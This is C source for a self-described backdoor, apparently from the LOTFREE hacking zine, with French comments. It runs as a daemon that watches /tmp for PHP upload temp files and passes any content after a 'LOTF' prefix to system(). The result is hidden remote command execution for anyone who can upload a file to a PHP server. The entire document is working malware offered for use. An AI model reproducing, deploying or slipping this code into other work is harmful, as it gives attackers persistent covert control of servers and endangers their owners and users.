/*
 * LOTFREE 9 - Inotify PHP upload watch backdoor
 */

#define _BSD_SOURCE
#include <sys/select.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

/**
 * gcc -o upload_watch upload_watch.c -lpthread -O2 -Wall -W -Werror -ansi -pedantic
 **/

int fd, wd;

void * lire_fichier(void *fichier)
{
  char buff[2048];
  int cnt;
  int fdesc;
  struct flock lock;
  char *cmd;

  fdesc = open((char*)fichier, O_RDONLY);
  if(fdesc<1)
    pthread_exit(NULL);

  memset(&lock, 0, sizeof(lock));
  lock.l_type = F_RDLCK;
  lock.l_whence = SEEK_SET;
  lock.l_start = 0;
  lock.l_len = 2048;

  if(fcntl(fdesc, F_SETLKW, &lock) != -1)
  {
    /* On s'en tient a 2048 octets */
    cnt = read(fdesc, buff, 2048);
    if(cnt>4)
    {
      buff[cnt]='\0';
      /* Si le contenu commence par LOTF */
      if(!strncmp(buff, "LOTF", 4))
      {
        cmd = buff + 4;
        /* On execute ce qui suit */
        system(cmd);
      }
    }

    lock.l_type = F_UNLCK;
    if(fcntl(fdesc, F_SETLK, &lock) == -1)
    {
      printf("fcntl set err\n");
    }
  }
  close(fdesc);
  pthread_exit(NULL);
}

int main(void)
{
    size_t r;
    fd_set fds;
    char buffer[8192];
    struct inotify_event *event;
    pthread_t monthread;

    /* Initialisation d'inotify */
    fd = inotify_init();
    if (fd < 0) {
        perror("inotify_init");
        return EXIT_FAILURE;
    }

    /* Surveillance du répertoire /tmp et ses fichiers
     * On accepte tous les évènements possibles */
    wd = inotify_add_watch(fd, "/tmp", IN_ALL_EVENTS);
    if (wd < 0) {
        perror("inotify_add_watch");
        return EXIT_FAILURE;
    }

    if(daemon(1,0) < 0)
    {
        perror("daemon");
        return EXIT_FAILURE;
    }

    while (1) {
        FD_ZERO(&fds);
        FD_SET(fd, &fds);
        if (select(fd + 1, &fds, NULL, NULL, 0) <= 0) {
            continue;
        }

        r = read(fd, buffer, sizeof(buffer));
        if (r <= 0) {
            perror("read");
            return EXIT_FAILURE;
        }

        event = (struct inotify_event *) buffer;

        /* Le nom des fichiers uploades commence normalement par php */
        if (event->len > 3) {
            if(!strncmp(event->name, "php", 3))
            {
                /* On intercepte a la fermeture du fichier */
                if(event->mask & IN_CLOSE_WRITE)
                {
                    pthread_create(&monthread, NULL, lire_fichier, (void *)event->name);
                }
            }
        }
    }

    pthread_exit(NULL);
    return EXIT_FAILURE;
}
